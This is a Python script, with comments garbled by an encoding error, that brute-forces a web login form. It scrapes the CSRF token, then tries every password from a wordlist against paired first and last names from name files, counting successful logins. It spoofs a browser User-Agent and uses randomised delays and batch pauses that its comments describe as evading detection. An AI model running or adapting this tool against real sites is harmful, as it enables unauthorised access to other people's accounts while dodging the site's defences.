import requests
from bs4 import BeautifulSoup
from dotenv import load_dotenv
import os
import time
import random

# 1. ‡πÇ‡∏´‡∏•‡∏î environment variables
load_dotenv()

# 2. ‡∏Å‡∏≥‡∏´‡∏ô‡∏î URL ‡∏à‡∏≤‡∏Å .env
base_url = os.getenv('BASE_URL')
login_url = f"{base_url}{os.getenv('LOGIN_URL')}"

print(f"üåê ‡πÉ‡∏ä‡πâ URL: {base_url}")
print("-" * 50)

# 3. ‡πÄ‡∏£‡∏¥‡πà‡∏° session ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÄ‡∏Å‡πá‡∏ö cookies
session = requests.Session()

# ‡πÉ‡∏ä‡πâ User-Agent ‡πÅ‡∏ö‡∏ö‡∏á‡πà‡∏≤‡∏¢‡πÜ ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏•‡∏µ‡∏Å‡πÄ‡∏•‡∏µ‡πà‡∏¢‡∏á‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
})

# 4. ‡πÇ‡∏´‡∏•‡∏î‡∏´‡∏ô‡πâ‡∏≤ login ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ô‡∏≥ CSRF Token
try:
    response = session.get(login_url)
    print(f"üìä Status Code: {response.status_code}")
    print(f"üìç Final URL: {response.url}")
    
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # 5. ‡∏î‡∏∂‡∏á CSRF Token ‡∏à‡∏≤‡∏Å input hidden
    csrf_input = soup.find('input', {'name': '__RequestVerificationToken'})
    if not csrf_input:
        print("‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö CSRF Token ‡πÉ‡∏ô‡∏´‡∏ô‡πâ‡∏≤ login")
        print("üîç ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö HTML structure...")
        
        # ‡πÅ‡∏™‡∏î‡∏á input fields ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡πÄ‡∏û‡∏∑‡πà‡∏≠ debug
        all_inputs = soup.find_all('input')
        print(f"‡∏û‡∏ö input fields ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô: {len(all_inputs)}")
        for i, input_field in enumerate(all_inputs, 1):
            input_name = input_field.get('name', '‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏ä‡∏∑‡πà‡∏≠')
            input_type = input_field.get('type', 'text')
            print(f"   {i}. Name: {input_name}, Type: {input_type}")
        
        # ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å HTML ‡∏•‡∏á‡πÑ‡∏ü‡∏•‡πå‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö
        with open('debug_response.html', 'w', encoding='utf-8') as f:
            f.write(response.text)
        print("üíæ ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å HTML ‡∏•‡∏á‡πÑ‡∏ü‡∏•‡πå debug_response.html ‡πÅ‡∏•‡πâ‡∏ß")
        
        exit()
        
    csrf_token = csrf_input['value']
    print(f"üîë CSRF Token ‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ: {csrf_token}")
    
except Exception as e:
    print(f"‚ùå ‡πÄ‡∏Å‡∏¥‡∏î‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÇ‡∏´‡∏•‡∏î‡∏´‡∏ô‡πâ‡∏≤ login: {e}")
    print("üîç ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö response...")
    
    if 'response' in locals():
        print(f"Status Code: {response.status_code}")
        print(f"Response Headers: {dict(response.headers)}")
        print(f"Response Text (first 500 chars): {response.text[:500]}")
    
    exit()

# 6. ‡∏≠‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå
def read_file_lines(filename):
    """‡∏≠‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå‡πÅ‡∏•‡∏∞‡∏Ñ‡∏∑‡∏ô‡∏Ñ‡πà‡∏≤‡πÄ‡∏õ‡πá‡∏ô list"""
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"‚ùå ‡πÑ‡∏°‡πà‡∏û‡∏ö‡πÑ‡∏ü‡∏•‡πå {filename}")
        return []

# ‡∏≠‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå
fnames = read_file_lines('fname.txt')
lnames = read_file_lines('lname.txt')
passwords = read_file_lines('password.txt')

if not fnames or not lnames or not passwords:
    print("‚ùå ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏≠‡πà‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå‡πÑ‡∏î‡πâ")
    exit()

print(f"üìä ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡πÇ‡∏´‡∏•‡∏î‡πÑ‡∏î‡πâ:")
print(f"   - ‡∏ä‡∏∑‡πà‡∏≠: {len(fnames)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£")
print(f"   - ‡∏ô‡∏≤‡∏°‡∏™‡∏Å‡∏∏‡∏•: {len(lnames)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£") 
print(f"   - ‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô: {len(passwords)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£")
print(f"   - ‡∏£‡∏ß‡∏°‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö: {len([f + l for f, l in zip(fnames, lnames)]) * len(passwords)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£")
print("-" * 50)

# 7. ‡∏ß‡∏ô‡∏•‡∏π‡∏õ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÑ‡∏ü‡∏•‡πå
attempt_count = 0
success_count = 0

# ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏Å‡∏≤‡∏£‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÄ‡∏ß‡∏•‡∏≤
MIN_DELAY = 1.0  # ‡∏´‡∏ô‡πà‡∏ß‡∏á‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡πà‡∏≥ 1 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
MAX_DELAY = 3.0  # ‡∏´‡∏ô‡πà‡∏ß‡∏á‡∏™‡∏π‡∏á‡∏™‡∏∏‡∏î 3 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
BATCH_SIZE = 5   # ‡∏ó‡∏î‡∏™‡∏≠‡∏ö 5 ‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡πÅ‡∏•‡πâ‡∏ß‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å‡∏ô‡∏≤‡∏ô
BATCH_DELAY = 5.0  # ‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å 5 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ‡∏´‡∏•‡∏±‡∏á‡∏ó‡∏î‡∏™‡∏≠‡∏ö 5 ‡∏Ñ‡∏£‡∏±‡πâ‡∏á

# ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ó‡∏µ‡πà password ‡∏Å‡πà‡∏≠‡∏ô (outer loop)
for password in passwords:
    print(f"\nüîê ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô: {password}")
    print("=" * 40)
    
    # fname ‡πÅ‡∏•‡∏∞ lname ‡∏ï‡πâ‡∏≠‡∏á‡∏™‡∏±‡∏°‡∏û‡∏±‡∏ô‡∏ò‡πå‡∏Å‡∏±‡∏ô (‡πÅ‡∏ñ‡∏ß‡∏ó‡∏µ‡πà 1 ‡∏Ñ‡∏π‡πà‡∏Å‡∏±‡∏ö‡πÅ‡∏ñ‡∏ß‡∏ó‡∏µ‡πà 1)
    for i in range(len(fnames)):
        if i < len(lnames):  # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡∏°‡∏µ lname ‡∏Ñ‡∏£‡∏ö‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà
            fname = fnames[i]
            lname = lnames[i]
            attempt_count += 1
            
            # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å‡∏´‡∏•‡∏±‡∏á‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏´‡∏•‡∏≤‡∏¢‡∏Ñ‡∏£‡∏±‡πâ‡∏á
            if attempt_count % BATCH_SIZE == 0:
                print(f"üõë ‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å‡∏´‡∏•‡∏±‡∏á‡∏ó‡∏î‡∏™‡∏≠‡∏ö {BATCH_SIZE} ‡∏Ñ‡∏£‡∏±‡πâ‡∏á...")
                print(f"‚è≥ ‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÄ‡∏ß‡∏•‡∏≤ {BATCH_DELAY} ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ...")
                time.sleep(BATCH_DELAY)
                print("‚ñ∂Ô∏è ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏ï‡πà‡∏≠...")
                print("-" * 30)
            
            print(f"üîç ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà {attempt_count}: {fname} {lname} / {password}")
            
            # ‡πÄ‡∏ï‡∏£‡∏µ‡∏¢‡∏°‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö POST
            login_data = {
                '__RequestVerificationToken': csrf_token,
                'fname': fname,
                'lname': lname,
                'password': password
            }
            
            # ‡∏™‡πà‡∏á POST ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏ü‡∏≠‡∏£‡πå‡∏° login
            post_response = session.post(login_url, data=login_data)
            
            # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
            if post_response.text.strip().lower() == "true":
                print("‚úÖ Login ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à (‡∏£‡∏∞‡∏ö‡∏ö‡∏ï‡∏≠‡∏ö true)")
                success_count += 1
            else:
                print("‚ùå Login ‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß (‡∏£‡∏∞‡∏ö‡∏ö‡∏ï‡∏≠‡∏ö false)")
            
            # ‡∏´‡∏¢‡∏∏‡∏î‡∏û‡∏±‡∏Å‡πÄ‡∏•‡πá‡∏Å‡∏ô‡πâ‡∏≠‡∏¢‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÑ‡∏°‡πà‡πÉ‡∏´‡πâ server ‡∏£‡∏±‡∏ö‡∏†‡∏≤‡∏£‡∏∞‡∏°‡∏≤‡∏Å‡πÄ‡∏Å‡∏¥‡∏ô‡πÑ‡∏õ
            # ‡πÉ‡∏ä‡πâ‡πÄ‡∏ß‡∏•‡∏≤‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÅ‡∏ö‡∏ö‡∏™‡∏∏‡πà‡∏°‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏•‡∏µ‡∏Å‡πÄ‡∏•‡∏µ‡πà‡∏¢‡∏á‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö
            delay = random.uniform(MIN_DELAY, MAX_DELAY)  # ‡∏´‡∏ô‡πà‡∏ß‡∏á 2-5 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
            print(f"‚è≥ ‡∏´‡∏ô‡πà‡∏ß‡∏á‡πÄ‡∏ß‡∏•‡∏≤ {delay:.1f} ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ...")
            time.sleep(delay)
            print("-" * 30)

# 8. ‡∏™‡∏£‡∏∏‡∏õ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
print("\n" + "=" * 50)
print("üìà ‡∏™‡∏£‡∏∏‡∏õ‡∏ú‡∏•‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö:")
print(f"   - ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏ó‡∏î‡∏™‡∏≠‡∏ö: {attempt_count}")
print(f"   - ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à: {success_count}")
print(f"   - ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏ó‡∏µ‡πà‡∏•‡πâ‡∏°‡πÄ‡∏´‡∏•‡∏ß: {attempt_count - success_count}")
print("=" * 50)
print("üéØ ‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡πÄ‡∏™‡∏£‡πá‡∏à‡∏™‡∏¥‡πâ‡∏ô!")